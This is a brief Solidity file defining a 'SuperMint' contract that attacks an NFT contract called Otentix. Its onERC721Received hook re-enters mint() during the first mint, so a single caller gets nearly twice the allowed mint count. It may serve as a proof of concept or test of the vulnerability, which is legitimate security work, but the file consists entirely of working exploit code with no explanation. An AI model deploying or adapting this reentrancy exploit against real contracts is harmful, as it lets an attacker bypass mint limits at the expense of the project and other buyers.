// SPDX-License-Identifier: MIT
pragma solidity >=0.5.3;

import "./Otentix.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract SuperMint is IERC721Receiver {
  Otentix implementation;
  uint maxMints;
  bool complete;

  constructor(address _implementation, uint _maxMints) {
    implementation = Otentix(_implementation);
    maxMints = _maxMints;
  }

  function beginMint() external {
    implementation.mint(maxMints);
  }

  function onERC721Received(
    address,
    address,
    uint256,
    bytes memory
  ) public virtual override returns (bytes4) {
    if (!complete) {
      complete = true;
      implementation.mint(maxMints - 1);
    }
    return this.onERC721Received.selector;
  }
}